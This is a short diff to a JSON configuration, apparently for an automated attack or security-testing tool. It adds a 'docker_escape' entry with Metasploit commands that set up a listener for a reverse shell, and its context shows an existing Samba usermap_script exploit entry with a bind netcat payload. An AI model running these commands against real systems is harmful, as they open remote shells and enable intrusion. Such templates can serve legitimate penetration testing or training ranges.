@@ -7,6 +7,12 @@
         "wait_time": "10",
         "config": ""
       },
+      "docker_escape": {
+        "instructions": "back \nuse exploit/multi/handler \nset LHOST {} \nset LPORT {LPORT} \nexploit",
+        "attack_type": "MetasploitAttack",
+        "wait_time": "20",
+        "config": ""
+      },
       "smb_server": {
         "instructions": "setg payload cmd/unix/bind_netcat\nuse exploit/multi/samba/usermap_script\nsetg RHOSTS {}\nsetg LPORT {LPORT}\nexploit -p cmd/unix/bind_netcat",
         "attack_type": "",
